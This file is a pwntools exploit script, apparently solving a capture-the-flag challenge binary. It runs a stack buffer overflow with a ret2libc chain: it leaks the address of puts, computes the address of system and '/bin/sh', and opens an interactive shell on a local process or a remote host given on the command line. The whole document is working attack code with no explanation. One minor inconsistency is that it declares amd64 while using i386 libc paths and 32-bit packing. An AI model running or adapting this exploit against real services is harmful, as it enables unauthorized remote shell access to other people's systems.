#!/usr/bin/python
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

local_file  = './330890cb0975439295262dd46dac13b9'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = '../libc6-i386_2.23-0ubuntu10_amd64.so'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
# elf, libc

# rop1
len = 42
payload = 'A'*len
payload += p32(elf.symbols['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])

ru('please tell me your name\n')
sl('TaQini')

ru('here:\n')
sl(payload)

puts = u32(rc(4))
offset = puts - libc.symbols['puts']
binsh = libc.search('/bin/sh').next() + offset

info_addr('puts = ', puts)
info_addr('binsh = ', binsh)

payload2 = 'A'*len
payload2 += p32(elf.symbols['system']) + p32(elf.symbols['main']) + p32(binsh)

ru('please tell me your name\n')
sl('TaQini')

ru('here:\n')
sl(payload2)

# log.warning('--------------')

p.interactive()

